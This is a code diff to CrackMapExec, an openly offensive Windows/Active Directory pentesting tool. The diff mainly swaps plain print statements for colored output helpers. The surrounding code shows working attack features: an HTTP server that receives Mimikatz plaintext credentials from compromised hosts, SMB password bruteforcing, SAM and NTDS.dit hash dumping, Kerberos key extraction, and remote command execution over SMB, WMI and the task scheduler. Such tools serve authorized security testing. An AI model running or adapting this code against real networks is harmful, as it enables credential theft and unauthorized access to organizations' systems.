@@ -29,6 +29,7 @@ from binascii import unhexlify, hexlify
 from Crypto.Cipher import DES, ARC4
 from datetime import datetime
 from time import ctime, time
+from termcolor import cprint, colored
 
 import StringIO
 import ntpath
@@ -49,6 +50,14 @@ OUTPUT_FILENAME = ''.join(random.sample(string.ascii_letters, 10))
 BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
 SMBSERVER_DIR   = 'served_over_smb'
 DUMMY_SHARE     = 'TMP'
+
+print_error  = lambda x: cprint("[-] ", 'red', attrs=['bold'], end=x+'\n')
+print_status = lambda x: cprint("[*] ", 'blue', attrs=['bold'], end=x+'\n')
+print_succ   = lambda x: cprint("[+] ", 'green', attrs=['bold'], end=x+'\n')
+print_att    = lambda x: cprint(x, 'yellow', attrs=['bold'])
+yellow = lambda x: colored(x, 'yellow', attrs=['bold'])
+green  = lambda x: colored(x, 'green', attrs=['bold'])
+red    = lambda x: colored(x, 'red', attrs=['bold'])
 
 # Structures
 # Taken from http://insecurety.net/?p=768
@@ -202,18 +211,16 @@ class MimikatzServer(BaseHTTPRequestHandler):
                 passw  = buf[i].split(':')[1].strip()
                 domain = buf[i-1].split(':')[1].strip()
                 user   = buf[i-2].split(':')[1].strip()
-                print '[+] {} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], domain, user, passw)
+                print_succ('{} Found plain text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], yellow(domain), yellow(user), yellow(passw)))
             i += 1
 
         credsfile_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
-        with open(credsfile_name, 'w') as creds:
+        with open('logs/' + credsfile_name, 'w') as creds:
             creds.write(data)
-        print "[*] {} Saved POST data to {}".format(self.client_address[0], credsfile_name)
+        print_status("{} Saved POST data to {}".format(self.client_address[0], yellow(credsfile_name)))
 
 class SMBServer(Thread):
     def __init__(self):
-        if os.geteuid() != 0:
-            exit('[!] Error: ** SMB Server must be run as root **')
         Thread.__init__(self)
 
     def run(self):
@@ -2295,9 +2302,9 @@ def dir_list(files,ip,path,pattern):
         for instance in pattern:
             if instance in result.get_longname():
                 if result.is_directory():
-                    print ("//%s/%s/%s [dir]" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
+                    print_att("//%s/%s/%s [dir]" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
                 else:
-                    print ("//%s/%s/%s" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
+                    print_att("//%s/%s/%s" % (ip, path.replace("//",""), result.get_longname().encode('utf8')))
     return 0
 
 def bruteforce(host, smb, s_name, domain):
@@ -2310,7 +2317,7 @@ def bruteforce(host, smb, s_name, domain):
             try:
                 #print "Trying {}:{}".format(user.strip(),passw.strip())
                 smb.login(user.strip(), passw.strip(), domain, '', '')
-                print "[+] {}:{} {} Found valid account! Domain: {} Username: {} Password: {}".format(host, args.port, s_name, domain, user.strip(), passw.strip())
+                print_succ("{}:{} {} Found valid account! Domain: {} Username: {} Password: {}".format(host, args.port, s_name, yellow(domain), yellow(user.strip()), yellow(passw.strip())))
                 if args.exhaust is False:
                     return
             except SessionError as e:
@@ -2382,7 +2389,7 @@ def connect(host):
         if not domain:
             domain = s_name
 
-        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), s_name, domain)
+        print_status("{}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), s_name, domain))
 
         #DC's seem to want us to logoff first
         #Workstations sometimes reset the connection, so we handle that here
@@ -2395,9 +2402,9 @@ def connect(host):
 
         if args.bruteforce:
             start_time = time()
-            print "[+] {}:{} {} Started SMB bruteforce".format(host, args.port, s_name)
+            print_status("{}:{} {} Started SMB bruteforce".format(host, args.port, s_name))
             bruteforce(host, smb, s_name, domain)
-            print "[+] {}:{} {} Finished SMB bruteforce (Completed in: {})".format(host, args.port, s_name, time() - start_time)
+            print_status("{}:{} {} Finished SMB bruteforce (Completed in: {})".format(host, args.port, s_name, time() - start_time))
 
         if args.user is not None and (args.passwd is not None or args.hash is not None):
             lmhash = ''
@@ -2412,75 +2419,78 @@ def connect(host):
                 try:
                     out = open(args.download.split('\\')[-1], 'wb')
                     smb.getFile(args.share, args.download, out.write)
+                    print_succ("{}:{} {} Downloaded file".format(host, args.port, s_name))
                 except SessionError as e:
-                    print '[-] {}:{} {}'.format(host, args.port, e)
+                    print_error('{}:{} {}'.format(host, args.port, e))
 
             if args.delete:
                 try:
                     smb.deleteFile(args.share, args.delete)
+                    print_succ("{}:{} {} Deleted file".format(host, args.port, s_name))
                 except SessionError as e:
-                    print '[-] {}:{} {}'.format(host, args.port, e)
+                    print_error('{}:{} {}'.format(host, args.port, e))
 
             if args.upload:
                 try:
                     up = open(args.upload[0] , 'rb')
                     smb.putFile(args.share, args.upload[1], up.read)
+                    print_succ("{}:{} {} Uploaded file".format(host, args.port, s_name))
                 except SessionError as e:
-                    print '[-] {}:{} {}'.format(host, args.port, e)
+                    print_error('{}:{} {}'.format(host, args.port, e))
 
             if args.list:
                 try:
                     dir_list = smb.listPath(args.share, args.list + '\\*')
-                    print "[+] {}:{} Contents of {}:".format(host, args.port, args.list)
+                    print_succ("{}:{} Contents of {}:".format(host, args.port, args.list))
                     for f in dir_list:
-                        print "%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), ctime(float(f.get_mtime_epoch())) ,f.get_longname())
+                        print_att("%crw-rw-rw- %10d  %s %s" % ('d' if f.is_directory() > 0 else '-', f.get_filesize(), ctime(float(f.get_mtime_epoch())) ,f.get_longname()))
                 except SessionError as e:
-                    print '[-] {}:{} {}'.format(host, args.port, e)
+                    print_error('{}:{} {}'.format(host, args.port, e))
 
             if args.spider:
                 start_time = time()
-                print "[+] {}:{} {} Started spidering".format(host, args.port, s_name)
+                print_status("{}:{} {} Started spidering".format(host, args.port, s_name))
                 spider(smb, host, args.share, args.spider, args.pattern, args.depth)
-                print "[+] {}:{} {} Done spidering (Completed in {})".format(host, args.port, s_name, time() - start_time)
+                print_status("{}:{} {} Done spidering (Completed in {})".format(host, args.port, s_name, time() - start_time))
 
             if args.wmi_query:
                 query = WMIQUERY(host, args.user, args.passwd, domain, args.hash, args.namespace)
                 res = query.run(args.wmi_query)
-                print "[+] {}:{} {} Executed specified WMI query:".format(host, args.port, s_name)
-                print ','.join(res.keys())
+                print_succ("{}:{} {} Executed specified WMI query:".format(host, args.port, s_name))
+                print yellow(' | '.join(res.keys()))
                 if len(res.values()) > 1:
                     for v in map(None, *res.values()):
-                        print ','.join(v)
+                        print yellow(' | '.join(v))
                 else:
                     for k in res:
                         for v in res[k]:
-                            print v
+                            print yellow(v)
 
             if args.enum_sessions:
                 rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
                 sessions = rpcenum.enum_sessions(host)
-                print "[+] {}:{} {} Current active sessions:".format(host, args.port, s_name)
+                print_succ("{}:{} {} Current active sessions:".format(host, args.port, s_name))
                 for session in sessions:
                     for fname in session.fields.keys():
-                        print fname, session[fname]
+                        print "{} {}".format(fname, yellow(session[fname]))
                     print "\n"
 
             if args.enum_lusers:
                 rpcenum = RPCENUM(args.user, args.passwd, domain, args.hash)
                 lusers = rpcenum.enum_logged_on_users(host)
-                print "[+] {}:{} {} Logged on users:".format(host, args.port, s_name)
+                print_succ("{}:{} {} Logged on users:".format(host, args.port, s_name))
                 for luser in lusers:
                     for fname in luser.fields.keys():
-                        print fname, luser[fname]
+                        print "{} {}".format(fname, yellow(luser[fname]))
                     print "\n"
 
             if args.sam:
                 sam_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, True)
                 sam_dump.dump(smb)
                 if sam_dump.dumped_sam_hashes:
-                    print "[+] {}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, s_name)
+                    print_succ("{}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, s_name))
                     for sam_hash in sam_dump.dumped_sam_hashes:
-                        print sam_hash
+                        print_att(sam_hash)
                 try:
                     sam_dump.cleanup()
                 except:
@@ -2495,17 +2505,17 @@ def connect(host):
                 ntds_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash, False, True, vss, ninja)
                 ntds_dump.dump(smb)
                 if ntds_dump.dumped_ntds_hashes:
-                    print "[+] {}:{} {} Dumping NTDS.dit secrets using the {} method (domain\uid:rid:lmhash:nthash):".format(host, args.port, s_name, args.ntds.upper())
+                    print_succ("{}:{} {} Dumping NTDS.dit secrets using the {} method (domain\uid:rid:lmhash:nthash):".format(host, args.port, s_name, args.ntds.upper()))
                     for h in ntds_dump.dumped_ntds_hashes['hashes']:
-                        print h
-                    print "[+] {}:{} {} Kerberos keys grabbed:".format(host, args.port, s_name)
+                        print_att(h)
+                    print_succ("{}:{} {} Kerberos keys grabbed:".format(host, args.port, s_name))
                     for h in ntds_dump.dumped_ntds_hashes['kerb']:
-                        print h
+                        print_att(h)
                 ntds_dump.cleanup()
 
             if args.enum_users:
                 user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash).dump(host)
-                print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, s_name, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
+                print_succ("{}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, s_name, yellow(user_dump['users']), user_dump['lthresh'], user_dump['lduration']))
 
             if args.mimikatz:
                 noOutput = True
@@ -2521,32 +2531,32 @@ def connect(host):
                     executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, domain, args.hash, args.share, args.command, noOutput)
                     result = executer.run(host)
                     if result:
-                        print '[+] {}:{} {} Executed specified command via SMBEXEC'.format(host, args.port, s_name)
-                        print result
+                        print_succ('{}:{} {} Executed specified command via SMBEXEC'.format(host, args.port, s_name))
+                        print_att(result)
 
                 elif args.execm == 'wmi':
                     executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share, noOutput)
                     result = executer.run(host, smb)
                     if result:
-                        print '[+] {}:{} {} Executed specified command via WMI'.format(host, args.port, s_name)
-                        print result
+                        print_succ('{}:{} {} Executed specified command via WMI'.format(host, args.port, s_name))
+                        print_att(result)
 
                 elif args.execm == 'atexec':
                     atsvc_exec = TSCH_EXEC(args.user, args.passwd, args.command, domain, args.hash, noOutput)
                     atsvc_exec.play(host)
                     if atsvc_exec.output:
-                        print '[+] {}:{} {} Executed specified command via ATEXEC'.format(host, args.port, s_name)
-                        print atsvc_exec.output
+                        print_succ('{}:{} {} Executed specified command via ATEXEC'.format(host, args.port, s_name))
+                        print_att(atsvc_exec.output)
 
                     atsvc_exec.cleanup()
 
             if args.list_shares:
                 share_list = _listShares(smb)
-                print '[+] {}:{} {} Available shares:'.format(host, args.port, s_name)
-                print '\tSHARE\t\t\tPermissions'
-                print '\t-----\t\t\t-----------'
+                print_succ('{}:{} {} Available shares:'.format(host, args.port, s_name))
+                print_att('\tSHARE\t\t\tPermissions')
+                print_att('\t-----\t\t\t-----------')
                 for share, perm in share_list.iteritems():
-                    print '\t{}\t\t\t{}'.format(share, perm)
+                    print_att('\t{}\t\t\t{}'.format(share, perm))
 
         try:
             smb.logoff()
@@ -2554,11 +2564,11 @@ def connect(host):
             pass
 
     except SessionError as e:
-        print "[-] {}:{} {}".format(host, args.port, e)
+        print_error("{}:{} {}".format(host, args.port, e))
         if args.verbose: traceback.print_exc()
 
     except DCERPCException as e:
-        print "[-] {}:{} DCERPC Error: {}".format(host, args.port, e)
+        print_error("{}:{} DCERPC Error: {}".format(host, args.port, e))
         if args.verbose: traceback.print_exc()
 
     except socket.error as e:
@@ -2571,13 +2581,14 @@ def concurrency(hosts):
         jobs = [pool.spawn(connect, str(host)) for host in hosts]
         joinall(jobs)
     except KeyboardInterrupt:
-        print "[!] Got CTRL-C! Exiting.."
+        print_status("Got CTRL-C! Exiting..")
         sys.exit()
 
 if __name__ == '__main__':
 
     if os.geteuid() is not 0:
-        sys.exit("[-] Run me as r00t!")
+        print_error("Run me as r00t!")
+        sys.exit(1)
 
     parser = argparse.ArgumentParser(description=""" CrackMapExec - Swiss army knife for pentesting Windows/Active Directory environments | @byt3bl33d3r\n
  Powered by Impacket https://github.com/CoreSecurity/impacket
@@ -2634,7 +2645,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     if args.verbose:
-        print "[*] Verbose output enabled"
+        print_status("Verbose output enabled")
         logging.basicConfig(format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
         log = logging.getLogger()
         log.setLevel(logging.INFO)
@@ -2650,7 +2661,8 @@ if __name__ == '__main__':
     if args.spider:
         patterns = []
         if not args.pattern and not args.patternfile:
-            sys.exit("[!] Please specify a '--pattern' or a '--patternfile'")
+            print_error("Please specify a '--pattern' or a '--patternfile'")
+            sys.exit(1)
 
         if args.patternfile is not None:
             for line in args.patternfile.readlines():
@@ -2662,8 +2674,9 @@ if __name__ == '__main__':
         args.pattern = patterns
 
     if args.mimikatz or args.ntds == 'ninja':
-        print "[*] Press CTRL-C at any time to exit"
-        print '[*] Note: This might take some time on large networks! Go grab a redbull!'
+        print_status("Press CTRL-C at any time to exit")
+        print_status('Note: This might take some time on large networks! Go grab a redbull!')
+        print "\n"
         server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
         t = Thread(name='HTTPServer', target=server.serve_forever)
         t.setDaemon(True)
